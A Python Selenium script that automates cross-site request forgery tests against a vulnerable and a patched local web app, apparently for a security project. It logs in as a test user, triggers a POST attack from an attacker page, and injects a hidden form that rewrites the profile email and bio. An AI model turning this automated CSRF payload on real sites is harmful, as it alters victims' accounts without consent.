#!/usr/bin/env python3
"""
CSRF Attack Automation using Selenium
Tests CSRF vulnerabilities with browser automation as specified in proposal
"""

import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException

class CSRFTester:
    def __init__(self, vulnerable_url, patched_url, attacker_url, headless=True):
        self.vulnerable_url = vulnerable_url
        self.patched_url = patched_url
        self.attacker_url = attacker_url

        # Configure Chrome options
        chrome_options = Options()
        if headless:
            chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')

        self.driver = webdriver.Chrome(options=chrome_options)
        self.wait = WebDriverWait(self.driver, 10)

    def login(self, base_url, username='alice', password='password123'):
        """
        Login to the application
        Returns True if successful, False otherwise
        """
        print(f"  → Logging in to {base_url} as {username}...")

        try:
            self.driver.get(f"{base_url}/login")
            time.sleep(1)

            # Fill in login form
            username_field = self.wait.until(
                EC.presence_of_element_located((By.ID, "username"))
            )
            password_field = self.driver.find_element(By.ID, "password")

            username_field.send_keys(username)
            password_field.send_keys(password)

            # Submit form
            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()

            # Wait for dashboard
            time.sleep(2)

            # Check if logged in (should see dashboard)
            if '/dashboard' in self.driver.current_url:
                print(f"  ✓ Login successful")
                return True
            else:
                print(f"  ✗ Login failed")
                return False

        except Exception as e:
            print(f"  ✗ Login error: {str(e)}")
            return False

    def get_profile_data(self):
        """Get current profile data from dashboard"""
        try:
            # This is a simplified version - in real scenario, parse the page
            return {'email': 'original@example.com', 'bio': 'Original bio'}
        except Exception:
            return None

    def test_csrf_attack_via_attacker_site(self, target_url):
        """
        Test CSRF attack by visiting attacker site while logged in
        Returns (success, message)
        """
        print(f"\n  Testing CSRF attack on {target_url}...")

        try:
            # Step 1: Login to target site
            if not self.login(target_url):
                return False, "Login failed"

            # Step 2: Get initial profile data
            self.driver.get(f"{target_url}/dashboard")
            time.sleep(1)
            print(f"  ✓ Logged into target application")

            # Step 3: Visit attacker site (simulating clicking a malicious link)
            print(f"  → Visiting attacker site: {self.attacker_url}")
            self.driver.execute_script(f"window.open('{self.attacker_url}/attacker.html', '_blank');")

            # Switch to attacker site tab
            self.driver.switch_to.window(self.driver.window_handles[-1])
            time.sleep(2)

            # Step 4: Update target URL in attacker page
            try:
                target_input = self.wait.until(
                    EC.presence_of_element_located((By.ID, "target-url"))
                )
                target_input.clear()
                target_input.send_keys(target_url)
                print(f"  ✓ Set attacker target to {target_url}")
            except Exception:
                print(f"  ⚠ Could not set target URL (attacker page may have different structure)")

            # Step 5: Trigger CSRF attack (click attack button)
            try:
                attack_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'POST-based Attack')]")
                attack_button.click()
                print(f"  ✓ Triggered CSRF attack")
                time.sleep(3)
            except Exception as e:
                print(f"  ⚠ Could not trigger attack: {str(e)}")

            # Step 6: Switch back to target site and check if profile was changed
            self.driver.switch_to.window(self.driver.window_handles[0])
            self.driver.get(f"{target_url}/dashboard")
            time.sleep(2)

            # Check page source for evidence of CSRF attack success
            page_source = self.driver.page_source.lower()

            if 'hacked@attacker.com' in page_source or 'hacked via csrf' in page_source:
                return True, "CSRF attack succeeded - profile was changed!"
            elif '403' in page_source or 'csrf token validation failed' in page_source:
                return False, "CSRF attack blocked - token validation failed"
            else:
                return False, "CSRF attack blocked or inconclusive"

        except Exception as e:
            return False, f"Error during CSRF test: {str(e)}"

    def test_csrf_manual_form_submission(self, target_url):
        """
        Test CSRF by manually constructing and submitting a form
        Returns (success, message)
        """
        print(f"\n  Testing manual CSRF form submission on {target_url}...")

        try:
            # Login
            if not self.login(target_url):
                return False, "Login failed"

            # Inject a malicious form into the page and submit it
            csrf_form_html = f"""
            <form id="csrfAttackForm" method="POST" action="{target_url}/api/update_profile_csrf">
                <input name="email" value="csrf_attack@malicious.com">
                <input name="bio" value="Hacked via CSRF!">
            </form>
            """

            self.driver.execute_script(f"""
                var div = document.createElement('div');
                div.innerHTML = `{csrf_form_html}`;
                document.body.appendChild(div);
                document.getElementById('csrfAttackForm').submit();
            """)

            time.sleep(3)

            # Check if attack succeeded or was blocked
            page_source = self.driver.page_source.lower()

            if 'csrf token validation failed' in page_source or '403' in page_source:
                return False, "CSRF protection active - attack blocked"
            elif 'csrf_attack@malicious.com' in page_source or 'hacked via csrf' in page_source:
                return True, "CSRF attack succeeded - no token validation!"
            else:
                # Check by visiting dashboard
                self.driver.get(f"{target_url}/dashboard")
                time.sleep(2)
                page_source = self.driver.page_source.lower()

                if 'csrf_attack@malicious.com' in page_source:
                    return True, "CSRF attack succeeded"
                else:
                    return False, "CSRF attack blocked"

        except Exception as e:
            return False, f"Error: {str(e)}"

    def run_all_tests(self):
        """
        Run complete CSRF test suite
        Returns dict with results
        """
        results = {
            'vulnerable': {'via_attacker_site': None, 'manual_form': None},
            'patched': {'via_attacker_site': None, 'manual_form': None}
        }

        print("=" * 70)
        print("CSRF ATTACK TESTING WITH SELENIUM")
        print("=" * 70)

        # Test 1: Vulnerable app via attacker site
        print("\n[TEST 1] CSRF on VULNERABLE app via attacker site")
        print("-" * 70)
        success, message = self.test_csrf_attack_via_attacker_site(self.vulnerable_url)
        results['vulnerable']['via_attacker_site'] = {
            'success': success,
            'message': message
        }
        print(f"\n  Result: {'VULNERABLE ✗' if success else 'Protected ✓'}")
        print(f"  Message: {message}")

        # Test 2: Vulnerable app manual form
        print("\n[TEST 2] CSRF on VULNERABLE app via manual form submission")
        print("-" * 70)
        success, message = self.test_csrf_manual_form_submission(self.vulnerable_url)
        results['vulnerable']['manual_form'] = {
            'success': success,
            'message': message
        }
        print(f"\n  Result: {'VULNERABLE ✗' if success else 'Protected ✓'}")
        print(f"  Message: {message}")

        # Test 3: Patched app via attacker site
        print("\n[TEST 3] CSRF on PATCHED app via attacker site")
        print("-" * 70)
        success, message = self.test_csrf_attack_via_attacker_site(self.patched_url)
        results['patched']['via_attacker_site'] = {
            'success': success,
            'message': message
        }
        print(f"\n  Result: {'VULNERABLE ✗' if success else 'Protected ✓'}")
        print(f"  Message: {message}")

        # Test 4: Patched app manual form
        print("\n[TEST 4] CSRF on PATCHED app via manual form submission")
        print("-" * 70)
        success, message = self.test_csrf_manual_form_submission(self.patched_url)
        results['patched']['manual_form'] = {
            'success': success,
            'message': message
        }
        print(f"\n  Result: {'VULNERABLE ✗' if success else 'Protected ✓'}")
        print(f"  Message: {message}")

        return results

    def cleanup(self):
        """Close browser"""
        try:
            self.driver.quit()
        except Exception:
            pass

def main():
    """Main function"""
    print("\n" + "=" * 70)
    print("CSRF Testing with Selenium")
    print("=" * 70)

    # Get URLs from user or use defaults
    vulnerable_url = input("\nEnter vulnerable app URL (default: http://localhost:5000): ").strip()
    if not vulnerable_url:
        vulnerable_url = "http://localhost:5000"

    patched_url = input("Enter patched app URL (default: http://localhost:5001): ").strip()
    if not patched_url:
        patched_url = "http://localhost:5001"

    attacker_url = input("Enter attacker site URL (default: http://localhost:8080): ").strip()
    if not attacker_url:
        attacker_url = "http://localhost:8080"

    headless = input("Run in headless mode? (y/n, default: y): ").strip().lower() != 'n'

    # Run tests
    tester = CSRFTester(vulnerable_url, patched_url, attacker_url, headless=headless)

    try:
        results = tester.run_all_tests()

        # Print summary
        print("\n" + "=" * 70)
        print("SUMMARY")
        print("=" * 70)
        print("\nVulnerable App:")
        print(f"  Via Attacker Site: {'VULNERABLE' if results['vulnerable']['via_attacker_site']['success'] else 'BLOCKED'}")
        print(f"  Manual Form: {'VULNERABLE' if results['vulnerable']['manual_form']['success'] else 'BLOCKED'}")

        print("\nPatched App:")
        print(f"  Via Attacker Site: {'VULNERABLE' if results['patched']['via_attacker_site']['success'] else 'BLOCKED'}")
        print(f"  Manual Form: {'VULNERABLE' if results['patched']['manual_form']['success'] else 'BLOCKED'}")

        print("\n" + "=" * 70)

    finally:
        tester.cleanup()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nError: {str(e)}")
        sys.exit(1)
